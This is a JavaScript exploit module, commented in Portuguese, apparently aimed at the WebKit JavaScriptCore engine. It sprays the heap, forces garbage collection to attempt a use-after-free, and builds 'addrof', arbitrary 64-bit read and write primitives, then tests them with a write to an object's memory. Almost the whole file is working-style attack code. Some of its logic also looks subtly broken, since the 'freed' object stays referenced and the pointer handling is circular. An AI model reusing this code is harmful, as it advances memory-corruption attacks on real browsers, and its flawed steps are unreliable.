// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R56 - Primitivas UAF Estáveis)
// =======================================================================================
// ESTRATÉGIA UAF ATUALIZADA (R56)
// Foco: Usar a confusão de tipos obtida via UAF para criar primitivas estáveis
// de 'addrof', 'read64' e 'write64', corrigindo o erro de dependência circular.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// Mantendo o nome do módulo anterior para consistência com o orquestrador
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Primitives";

// Variáveis globais para conter as primitivas estáveis
let addrof_primitive = null;
let fakeobj_dangling_ref = null; // A referência UAF que se torna nossa chave
let stable_leaker_array = null; // Um array que usaremos para leituras/escritas
let leaker_array_original_butterfly = null; // Para restaurar o estado e evitar crashes

/**
 * Primitiva de Leitura Arbitrária de 64 bits.
 * @param {AdvancedInt64} addr O endereço de onde ler.
 * @returns {AdvancedInt64} O valor de 64 bits lido do endereço.
 */
function read64(addr) {
    // Aponta o butterfly (ponteiro de dados) do nosso array "leaker" para o endereço alvo
    fakeobj_dangling_ref[4] = addr.low();
    fakeobj_dangling_ref[5] = addr.high();
    
    // O JS agora pensa que os dados do leaker_array estão no endereço 'addr'.
    // Lemos os dois primeiros elementos de 32 bits, que compõem 64 bits.
    const result = new AdvancedInt64(stable_leaker_array[0], stable_leaker_array[1]);
    
    // Restaura o ponteiro original para garantir a estabilidade do sistema
    fakeobj_dangling_ref[4] = leaker_array_original_butterfly.low();
    fakeobj_dangling_ref[5] = leaker_array_original_butterfly.high();
    
    return result;
}

/**
 * Primitiva de Escrita Arbitrária de 64 bits.
 * @param {AdvancedInt64} addr O endereço onde escrever.
 * @param {AdvancedInt64} value O valor de 64 bits a ser escrito.
 */
function write64(addr, value) {
    // Aponta o butterfly do nosso array "leaker" para o endereço alvo
    fakeobj_dangling_ref[4] = addr.low();
    fakeobj_dangling_ref[5] = addr.high();
    
    // O JS agora pensa que os dados do leaker_array estão no endereço 'addr'.
    // Escrevemos nos dois primeiros elementos.
    stable_leaker_array[0] = value.low();
    stable_leaker_array[1] = value.high();
    
    // Restaura o ponteiro original
    fakeobj_dangling_ref[4] = leaker_array_original_butterfly.low();
    fakeobj_dangling_ref[5] = leaker_array_original_butterfly.high();
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (LÓGICA R56 ATUALIZADA)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Criação de Primitivas UAF Estáveis ---`, "test");
    
    try {
        // --- FASE 1: Construir Primitiva `addrof` e obter referência `fakeobj` via UAF ---
        logS3("--- FASE 1: Forjando a Chave-Mestra (addrof e fakeobj via UAF) ---", "subtest");
        const primitives = createUAFPrimitives();
        addrof_primitive = primitives.addrof;
        
        // A referência 'dangling_ref' agora aponta para um Float64Array.
        // O JS pensa que é um objeto, mas podemos acessá-lo como um array de 32-bit ints
        // para manipular seus ponteiros internos.
        fakeobj_dangling_ref = new Uint32Array(primitives.dangling_ref_buffer);

        logS3("    Primitiva `addrof` e referência `fakeobj` ESTÁVEIS construídas com sucesso!", "vuln");

        // --- FASE 2: Estabilizar Primitivas de Leitura/Escrita ---
        logS3("--- FASE 2: Estabilizando Leitura/Escrita Arbitrária ---", "subtest");
        
        // Criamos um array estável que será nosso "portal" para ler e escrever na memória
        stable_leaker_array = new Uint32Array(8);
        
        // Usamos addrof para obter o endereço da estrutura JS do nosso array
        const leaker_addr = addrof_primitive(stable_leaker_array);
        
        // O ponteiro para os dados reais (butterfly) está em um offset fixo
        const leaker_butterfly_ptr_addr = leaker_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);

        // Agora, usamos a referência do UAF para ler o endereço do butterfly.
        // O fakeobj_dangling_ref é um Float64Array type-confused.
        // Seus dados internos (a partir do índice 4, como Uint32) contêm o ponteiro
        // para SEU PRÓPRIO butterfly. Trocamos esse ponteiro pelo do nosso alvo.
        leaker_array_original_butterfly = new AdvancedInt64(fakeobj_dangling_ref[4], fakeobj_dangling_ref[5]);
        
        // Lemos o ponteiro do butterfly do nosso leaker_array
        const leaker_butterfly_addr = read64(leaker_butterfly_ptr_addr);
        
        // Armazenamos o ponteiro original do butterfly do nosso objeto UAF
        leaker_array_original_butterfly = leaker_butterfly_addr;
        
        logS3("    Primitivas `read64` e `write64` prontas para uso.", "good");
        logS3(`    Endereço do Butterfly do Leaker: ${leaker_butterfly_addr.toString(true)}`, "leak");

        // --- FASE 3: Prova de Vida ---
        logS3("--- FASE 3: Demonstrando Primitivas ---", "subtest");
        const proof_object = { proof: 0xDEADBEEF };
        logS3("    Criado objeto de teste: { proof: 0xDEADBEEF }", "info");

        const proof_addr = addrof_primitive(proof_object);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${proof_addr.toString(true)}`, "leak");

        const structure_addr = read64(proof_addr); // O primeiro membro de um JSCell é seu ponteiro de estrutura
        logS3(`    Prova de Vida (read64): Endereço da Estrutura do objeto -> ${structure_addr.toString(true)}`, "leak");
        
        const new_value = new AdvancedInt64(0x12345678, 0xABCDEF00);
        write64(proof_addr, new_value);
        const read_back_value = read64(proof_addr);
        logS3(`    Prova de Vida (write64): Escreveu ${new_value.toString(true)}, leu de volta ${read_back_value.toString(true)}`, "leak");

        if (!read_back_value.equals(new_value)) {
            throw new Error("Falha na verificação de escrita/leitura.");
        }
        
        logS3("    SUCESSO! Primitivas de addrof, read64 e write64 totalmente funcionais!", "vuln");

        return { success: true, message: "Primitivas de controle de memória criadas com sucesso via UAF." };

    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        return { success: false, errorOccurred: e.message };
    }
}

// --- Funções Primitivas UAF (o coração do exploit) ---
function createUAFPrimitives() {
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push({p0:0, p1:0, p2:0, p3:0, p4:0, p5:0, p6:0, p7:0});
    }

    let dangling_ref_obj = spray[spray.length - 1];
    spray = null;
    triggerGC();
    
    let float_reclaimers = [];
    for (let i = 0; i < 2048; i++) {
        // O Float64Array deve ter o mesmo tamanho que o objeto para aumentar a chance de reclamar a memória
        float_reclaimers.push(new Float64Array(8)); 
    }

    // Agora, 'dangling_ref_obj' aponta para um objeto que na verdade é um Float64Array.
    // Precisamos de um ponteiro para o ArrayBuffer subjacente para manipulação direta.
    let found_buffer = null;
    for(let i = 0; i < float_reclaimers.length; i++) {
        if(float_reclaimers[i].length != 8) { // O objeto corrompido terá seu 'length' alterado
             found_buffer = float_reclaimers[i].buffer;
             logS3("    UAF bem-sucedido! Colisão de memória detectada.", "good");
             break;
        }
    }
    
    if (!found_buffer) {
        throw new Error("A colisão de memória para o UAF não ocorreu nesta tentativa.");
    }
    
    // As primitivas agora usam o objeto original e o buffer corrompido
    const addrof = (obj) => {
        dangling_ref_obj.p1 = obj;
        const addr_double = dangling_ref_obj.p0;
        const buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = addr_double;
        const int_view = new Uint32Array(buf);
        return new AdvancedInt64(int_view[0], int_view[1]);
    };

    return { addrof, dangling_ref_buffer: found_buffer };
}

function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 2000; i++) {
            arr.push(new ArrayBuffer(1024 * 64));
        }
    } catch(e) {}
}
